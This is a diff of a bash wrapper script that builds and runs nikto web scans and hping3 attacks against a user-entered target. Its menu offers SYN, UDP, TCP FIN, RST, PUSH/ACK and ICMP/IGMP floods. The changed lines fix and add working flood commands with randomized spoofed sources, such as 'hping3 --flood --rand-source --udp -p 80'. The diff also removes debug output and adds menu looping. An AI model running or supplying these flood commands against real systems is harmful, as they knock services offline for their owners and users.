@@ -95,12 +95,8 @@ nikto()
     if [[ $nikto == "Y" || $nikto == "y" ]]; then
         cd tools/nikto
         touch attack_nikto.txt
-        echo "DEBUG _ _ _ "
-        pwd
-        echo "DEBUG - - - "
         echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
         cd ../..
-        echo "WE ARE BACK" && pwd
         echo -n "$target" >> tools/nikto/attack_nikto.txt
         cd tools/nikto
         bash attack_nikto.txt
@@ -158,18 +154,20 @@ hping()
         echo "5) Perform TCP RST flood"
         echo "6) Perform PUSH and ACK floods"
         echo "7) Perform ICMP and IGMP floods"
+        echo "8) Exit"
         echo "- - - - - - - - - - - - - - - - - - - - - - -"
         echo -n "Which one would you like to do?"
         read choice
         if [[ $choice == "1" ]]; then
           cd hping/
           touch host_alive.txt
-          echo -n "hping3 -c 2 -V -p 80 -s 5050 -a " > host_alive.txt
+          echo -n "hping3 -c 1 -V -p 80 -s 5050 -F " > host_alive.txt
           cd ..
           echo -n "$target" >> hping/host_alive.txt
           cd hping/
           bash host_alive.txt
           cd ..
+          hping
         elif [[ $choice == "2" ]]; then
           cd hping/
           touch hping_dos.txt
@@ -179,16 +177,19 @@ hping()
           cd hping/
           bash hping_dos.txt
           cd ..
+          hping
 
         elif [[ $choice == "3" ]]; then
           cd hping/
           touch hping_udp.txt
-          echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
+          echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_udp.txt #we will do port 80, in specific cases you can manually change it to port 443
           cd ..
           echo -n "$target" >> hping/hping_udp.txt
           cd hping/
           bash hping_udp.txt
           cd ..
+          hping
+
         elif [[ $choice == "4" ]]; then
           cd hping/
           touch hping_tcp_fin.txt
@@ -198,10 +199,12 @@ hping()
           cd hping/
           bash hping_tcp_fin.txt
           cd ..
+          hping
+
         elif [[ $choice == "5" ]]; then
           cd hping/
           touch hping_tcp_rst.txt
-          echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
+          echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_rst.txt #we will do port 80, in specific cases you can manually change it to port 443
           cd ..
           echo -n "$target" >> hping/hping_tcp_rst.txt
           cd hping/
